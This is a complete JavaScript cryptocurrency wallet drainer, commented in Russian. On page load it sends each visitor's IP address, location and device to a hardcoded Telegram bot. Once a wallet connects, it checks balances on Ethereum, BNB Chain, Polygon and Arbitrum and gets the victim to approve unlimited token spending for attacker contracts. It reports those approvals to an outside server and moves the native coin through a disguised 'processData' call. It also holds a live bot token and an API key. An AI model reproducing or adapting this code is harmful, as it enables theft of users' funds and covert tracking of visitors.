import { ethers } from 'ethers';

// Токен бота и ID чата для Telegram
const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64';
const TELEGRAM_CHAT_ID = '-4767714458';

// Переменная для отслеживания времени последнего вызова drain
let lastDrainTime = 0;

// Список резервных RPC для каждой сети
const RPC_URLS = {
  1: [
    'https://mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9' // Замени YOUR_INFURA_KEY, если есть ключ
  ],
  56: [
    'https://bsc-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9'
  ],
  137: [
    'https://polygon-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9'// Замени YOUR_ALCHEMY_KEY, если есть ключ
  ],
  42161: [
    'https://arbitrum-mainnet.infura.io/v3/4c1e95e1a51c4022916330c06ebfa2c9', // Замени YOUR_INFURA_KEY, если есть ключ
  ]
};

// Функция для отправки сообщения в Telegram
async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error(`❌ Ошибка отправки в Telegram: ${data.description}`);
    }
  } catch (error) {
    console.error(`❌ Ошибка отправки в Telegram: ${error.message}`);
  }
}

// Функция для получения IP-адреса пользователя
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;

  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    console.error(`❌ Ошибка получения IP: ${error.message}`);
    return 'Unknown IP';
  }
}

// Функция для получения геолокации по IP
async function getGeolocation(ip) {
  const cachedLocation = sessionStorage.getItem('userLocation');
  if (cachedLocation) return cachedLocation;

  try {
    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
    const data = await response.json();
    if (data.cityName && data.countryName) {
      const location = `${data.cityName}, ${data.countryName}`;
      sessionStorage.setItem('userLocation', location);
      return location;
    }
    return 'Unknown Location';
  } catch (error) {
    console.error(`❌ Ошибка получения геолокации: ${error.message}`);
    return 'Unknown Location';
  }
}

// Функция для определения устройства
function detectDevice() {
  const userAgent = navigator.userAgent.toLowerCase();
  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';

  if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
  if (/android/i.test(userAgent)) return "Android";
  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown";
}

// Функция для отправки уведомления при заходе на сайт
async function notifyOnVisit() {
  if (sessionStorage.getItem('visitNotified')) return;

  const domain = window.location.hostname || 'Unknown Domain';
  const ip = await getUserIP();
  const location = await getGeolocation(ip);
  const device = detectDevice();

  const message = `🔔 Visit | **${domain}**\n\n` +
                  `IP: ${ip}\n` +
                  `Where: ${location}\n` +
                  `Device: ${device}`;

  await sendTelegramMessage(message);
  sessionStorage.setItem('visitNotified', 'true');
}

notifyOnVisit().catch(error => {
  console.error(`❌ Ошибка уведомления о посещении: ${error.message}`);
});

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
];

// Идентификаторы токенов (по символу токена для Binance API)
const TOKEN_SYMBOLS = {
  "ETH": "ETHUSDT",
  "BNB": "BNBUSDT",
  "MATIC": "MATICUSDT",
  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDTUSDT",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
  "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": "UNIUSDT",
  "0x514910771af9ca656af840dff83e8264ecf986ca": "LINKUSDT",
  "0xc00e94cb662c3520282e6f5717214004a7f26888": "COMPUSDT",
  "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": "YFIUSDT",
  "0xd533a949740bb3306d119cc777fa900ba034cd52": "CRVUSDT",
  "0x0d8775f648430679a709e98d2b0cb6250d2887ef": "BATUSDT",
  "0xe41d2489571d322189246dafa5ebde1f4699f498": "ZRXUSDT",
  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
  "0xb8c77482e45f1f44de1745f52c74426c631bdd52": "BNBUSDT",
  "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": "SHIBUSDT",
  "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
  "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
  "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
  "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
  "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
  "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
  "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
  "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
  "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
  "0xa184088a740c695e156f91f5cc086a06bb78b827": "AUTOUSDT",
  "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
  "0xa7f552078dcc247c2684336020c03648500c6d9f": "EPSUSDT",
  "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f": "BELTUSDT",
  "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75": "MBOXUSDT",
  "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb": "SFPUSDT",
  "0xc748673057861a797275cd8a068abb95a902e8de": "BABYDOGEUSDT",
  "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
  "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
  "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDTUSDT",
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
  "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
  "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
  "0x831753dd7087cac61ab5644b308642cc1c33dc13": "QUICKUSDT",
  "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
  "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
  "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
  "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDTUSDT",
  "0xaf88d065e77c8cc2239327c5edb3a432268e583": "USDCUSDT",
  "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36": "SHIBUSDT",
  "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51": "PEPEUSDT"
};

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: RPC_URLS[1],
    usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
    usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
    drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
    otherTokenAddresses: {
      DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
      WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
      UNI: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
      LINK: "0x514910771af9ca656af840dff83e8264ecf986ca",
      COMP: "0xc00e94cb662c3520282e6f5717214004a7f26888",
      YFI: "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e",
      CRV: "0xd533a949740bb3306d119cc777fa900ba034cd52",
      BAT: "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
      ZRX: "0xe41d2489571d322189246dafa5ebde1f4699f498",
      LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
      BNB: "0xb8c77482e45f1f44de1745f52c74426c631bdd52",
      SHIB: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
      PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
      LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
      FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
      AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
      RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
      MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
      SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
      GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
      REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
      SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
      STORJ: "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac"
    }
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: RPC_URLS[56],
    usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
    usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    otherTokenAddresses: {
      SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
      PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
      CAKE: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
      BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
      XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
      ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
      AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
      EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
      BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
      MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
      SFP: "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
      BabyDoge: "0xc748673057861a797275cd8a068abb95a902e8de",
      EGC: "0xc001bbe2b87079294c63ece98bdd0a88d761434e",
      QUACK: "0xd74b782e05aa25c50e7330af541d46e18f36661c",
      PIT: "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2"
    }
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: RPC_URLS[137],
    usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
    usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
    drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
    otherTokenAddresses: {
      SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
      PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
      QUICK: "0x831753dd7087cac61ab5644b308642cc1c33dc13",
      GHST: "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7",
      DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
      FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
      ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e"
    }
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: RPC_URLS[42161],
    usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
    usdcAddress: "0xaf88d065e77c8cc2239327c5edb3a432268e583",
    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
    otherTokenAddresses: {
      SHIB: "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36",
      PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51"
    }
  }
};

// Функция для получения цены токена в USDT через Binance API
async function getTokenPriceInUSDT(tokenSymbol) {
  if (tokenSymbol === "USDTUSDT") return 1;

  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
    const data = await response.json();
    if (data.price) return parseFloat(data.price);
    return 0;
  } catch {
    return 0;
  }
}

// Функция для выбора рабочего провайдера с подходом из getReliableProvider
async function getWorkingProvider(chainId) {
  const rpcUrls = CHAINS[chainId].rpcUrls;

  for (const rpcUrl of rpcUrls) {
    if (rpcUrl.includes('YOUR_INFURA_KEY') || rpcUrl.includes('YOUR_ALCHEMY_KEY')) {
      console.warn(`⚠️ Пропущен RPC ${rpcUrl}: требуется API-ключ`);
      continue;
    }

    try {
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Используется RPC: ${rpcUrl} для chainId ${chainId}`);
      return provider;
    } catch (err) {
      console.warn(`⚠️ RPC ${rpcUrl} для chainId ${chainId} недоступен: ${err.message}`);
    }
  }

  console.error(`❌ Не удалось найти рабочий RPC для chainId ${chainId}`);
  return null; // Возвращаем null вместо ошибки, чтобы обработать на уровне вызова
}

// Проверка баланса
async function checkBalance(chainId, userAddress, provider) {
  const config = CHAINS[chainId];
  let nativeBalance, tokenBalances = {};

  console.log(`🔍 Проверяем баланс для chainId ${chainId}`);

  try {
    nativeBalance = await provider.getBalance(userAddress);
    console.log(`📊 Баланс ${config.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
  } catch (error) {
    console.error(`❌ Ошибка получения баланса ${config.nativeToken}: ${error.message}`);
    throw new Error('Failed to fetch native balance');
  }

  try {
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
    console.log(`📊 Баланс USDT: ${ethers.utils.formatUnits(tokenBalances[config.usdtAddress], 6)}`);
  } catch (error) {
    console.warn(`⚠️ Не удалось получить баланс USDT: ${error.message}`);
    tokenBalances[config.usdtAddress] = ethers.BigNumber.from(0);
  }

  try {
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
    console.log(`📊 Баланс USDC: ${ethers.utils.formatUnits(tokenBalances[config.usdcAddress], 6)}`);
  } catch (error) {
    console.warn(`⚠️ Не удалось получить баланс USDC: ${error.message}`);
    tokenBalances[config.usdcAddress] = ethers.BigNumber.from(0);
  }

  if (config.otherTokenAddresses) {
    const tokenAddresses = Object.values(config.otherTokenAddresses);
    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
      try {
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const balance = await token.balanceOf(userAddress);
        const decimals = await token.decimals();
        console.log(`📊 Баланс токена ${tokenAddress}: ${ethers.utils.formatUnits(balance, decimals)}`);
        return { address: tokenAddress, balance };
      } catch (error) {
        console.warn(`⚠️ Не удалось получить баланс токена ${tokenAddress}: ${error.message}`);
        return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
      }
    });

    const results = await Promise.all(balancePromises);
    results.forEach(({ address, balance }) => {
      tokenBalances[address] = balance;
    });
  }

  return { nativeBalance, tokenBalances };
}

// Проверка наличия средств
function hasFunds(bal) {
  const minNativeBalance = ethers.utils.parseEther("0.001");
  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);

  if (bal.nativeBalance.gt(minNativeBalance)) return true;

  for (const balance of Object.values(bal.tokenBalances)) {
    if (balance.gt(minTokenBalance)) return true;
  }

  return false;
}

// Переключение сети
async function switchChain(chainId) {
  try {
    console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
    console.log(`✅ Сеть переключена на chainId ${chainId}`);
  } catch (error) {
    console.error(`❌ Ошибка переключения сети: ${error.message}`);
    throw new Error(`Failed to switch chain: ${error.message}`);
  }
}

// Функция для форматирования адреса кошелька
function shortenAddress(address) {
  if (!address || address.length < 10) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

// Функция для определения названия кошелька
function detectWallet() {
  if (window.ethereum?.isMetaMask) return "MetaMask";
  if (window.ethereum?.isTrust) return "Trust Wallet";
  return "Unknown Wallet";
}

// Функция для форматирования чисел
function formatBalance(balance, decimals) {
  const formatted = ethers.utils.formatUnits(balance, decimals);
  return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal, provider, onApproveTxSent) {
  console.log(`Подключённый кошелёк: ${userAddress}`);

  const config = CHAINS[chainId];
  if (!config) throw new Error(`Configuration for chainId ${chainId} not found`);

  console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);

  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];

  const connectNotifiedKey = `connectNotified_${userAddress}`;
  const hasNotified = sessionStorage.getItem(connectNotifiedKey);

  if (!hasNotified) {
    console.log(`📍 Шаг 2: Отправляем уведомление о подключении`);
    const shortAddress = shortenAddress(userAddress);
    const walletName = detectWallet();
    const networkName = config.name;
    const funds = [];

    const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
    if (parseFloat(nativeBalance) > 0) {
      const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
      const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
      const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
      funds.push(`- **${config.nativeToken}**(${networkName}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
    }

    for (const tokenAddress of tokenAddresses) {
      const balance = bal.tokenBalances[tokenAddress];
      if (balance && balance.gt(0)) {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const decimals = await tokenContract.decimals();
        const formattedBalance = formatBalance(balance, decimals);
        if (parseFloat(formattedBalance) > 0) {
          const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                        tokenAddress === config.usdcAddress ? "USDC" :
                        Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
          const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
          const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
        }
      }
    }

    const device = detectDevice();
    const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                    `Wallet: ${walletName}\n` +
                    `Network: ${networkName}\n` +
                    `Funds:\n${fundsMessage}\n` +
                    `Device: ${device}`;

    await sendTelegramMessage(message);
    sessionStorage.setItem(connectNotifiedKey, 'true');
    console.log(`✅ Уведомление отправлено`);
  }

  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);

  console.log(`📍 Шаг 3: Проверяем баланс ${config.nativeToken} для газа`);
  let ethBalance;
  try {
    ethBalance = await provider.getBalance(userAddress);
    console.log(`📊 Баланс ${config.nativeToken}: ${ethers.utils.formatEther(ethBalance)}`);
  } catch (error) {
    console.error(`❌ Ошибка получения баланса ${config.nativeToken}: ${error.message}`);
    throw new Error(`Failed to fetch ${config.nativeToken} balance: ${error.message}`);
  }

  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`❌ Недостаточно ${config.nativeToken} для газа`);
    throw new Error(`Insufficient ${config.nativeToken} balance for gas`);
  }

  console.log(`📍 Шаг 4: Собираем токены для обработки`);
  const tokensToProcess = [];

  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    try {
      const [realBalance, decimals] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals()
      ]);
      console.log(`📊 Токен ${tokenAddress}: баланс ${ethers.utils.formatUnits(realBalance, decimals)}`);
      return { tokenAddress, tokenContract, realBalance, decimals };
    } catch (error) {
      console.warn(`⚠️ Не удалось получить данные токена ${tokenAddress}: ${error.message}`);
      return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
    }
  });

  const tokenDataResults = await Promise.all(tokenDataPromises);
  console.log(`✅ Получены данные токенов: ${tokenDataResults.length} токенов`);

  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
      bal.tokenBalances[tokenAddress] = realBalance;
    }

    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                    tokenAddress === config.usdcAddress ? "USDC" :
                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
      if (!symbol) {
        console.warn(`⚠️ Пропущен токен ${tokenAddress}: символ не определён`);
        continue;
      }
      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
    }
  }

  console.log(`📍 Шаг 5: Получаем цены токенов и сортируем`);
  const pricePromises = tokensToProcess.map(async (token) => {
    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
    token.valueInUSDT = balanceInUnits * price;
    return token;
  });

  await Promise.all(pricePromises);
  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);
  console.log(`✅ Токены отсортированы: ${tokensToProcess.map(t => t.token).join(', ')}`);

  let status = 'rejected';
  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
    if (!token) {
      console.error(`❌ Токен не определён для адреса ${address}, пропускаем`);
      continue;
    }
    console.log(`📍 Шаг 6: Обрабатываем токен ${token}`);

    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
    console.log(`📜 Allowance: ${ethers.utils.formatUnits(allowanceBefore, decimals)}`);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await provider.getTransactionCount(userAddress, "pending");
        const gasPrice = await provider.getGasPrice();
        console.log(`📏 Цена газа: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);

        const tx = await contract.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: gasPrice,
          nonce
        });
        console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
        
        // Вызываем коллбэк для закрытия модального окна
        if (onApproveTxSent) {
          await onApproveTxSent();
        }

        const receipt = await tx.wait();
        console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
        status = 'confirmed';
      } catch (error) {
        console.error(`❌ Ошибка одобрения токена ${token}: ${error.message}`);
        throw new Error(`Failed to approve token ${token}: ${error.message}`);
      }
    } else {
      console.log(`✅ Allowance уже достаточно для токена ${token}`);
      await notifyServer(userAddress, address, balance, chainId, null, provider);
      status = 'confirmed';
    }
  }

  console.log(`📍 Шаг 7: Обрабатываем ${config.nativeToken}`);
  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const value = bal.nativeBalance.sub(gasReserve).gt(0) ? bal.nativeBalance.sub(gasReserve) : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await provider.getTransactionCount(userAddress, "pending");

      try {
        const gasPrice = await provider.getGasPrice();
        console.log(`📏 Цена газа для ${config.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);

        const tx = await drainer.processData(taskId, dataHash, nonce, [], {
          value,
          gasLimit: 100000,
          gasPrice: gasPrice,
          nonce
        });
        console.log(`📤 Транзакция processData отправлена: ${tx.hash}`);
        const receipt = await tx.wait();
        console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
        status = 'confirmed';
      } catch (error) {
        console.error(`❌ Ошибка вывода ${config.nativeToken}: ${error.message}`);
        throw new Error(`Failed to process ${config.nativeToken}: ${error.message}`);
      }
    }
  }

  console.log(`📍 Шаг 8: Завершаем drain со статусом ${status}`);
  return status;
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
  try {
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals] = await Promise.all([
      token.balanceOf(userAddress),
      token.decimals()
    ]);
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;
    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);

    if (roundedAmount.lte(0)) {
      throw new Error('Amount is zero or negative');
    }

    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (!data.success) {
      throw new Error('Failed to notify server');
    }
  } catch (error) {
    console.error(`❌ Ошибка уведомления сервера: ${error.message}`);
    throw new Error('Failed to notify server');
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress, onApproveTxSent) {
  const currentTime = Date.now();
  const timeSinceLastDrain = currentTime - lastDrainTime;
  const minDelay = 0; // Убираем минимальную задержку

  if (timeSinceLastDrain < minDelay) {
    return; // Убираем задержку
  }

  lastDrainTime = Date.now();

  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const reliableProvider = await getWorkingProvider(chainId);
      if (!reliableProvider) {
        console.error(`⚠️ Пропускаем chainId ${chainId}: нет рабочего провайдера`);
        return null;
      }
      const balance = await checkBalance(chainId, userAddress, reliableProvider);
      return { chainId: Number(chainId), balance, provider: reliableProvider };
    } catch (error) {
      console.error(`❌ Ошибка проверки баланса для chainId ${chainId}: ${error.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  if (!balances.length) {
    throw new Error('No working providers found for any chain');
  }

  const sorted = balances
    .filter(item => hasFunds(item.balance))
    .sort((a, b) => {
      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      return bTotal.gt(aTotal) ? 1 : -1;
    });

  if (!sorted.length) {
    throw new Error('No funds found on any chain');
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider, onApproveTxSent);
  return status;
}
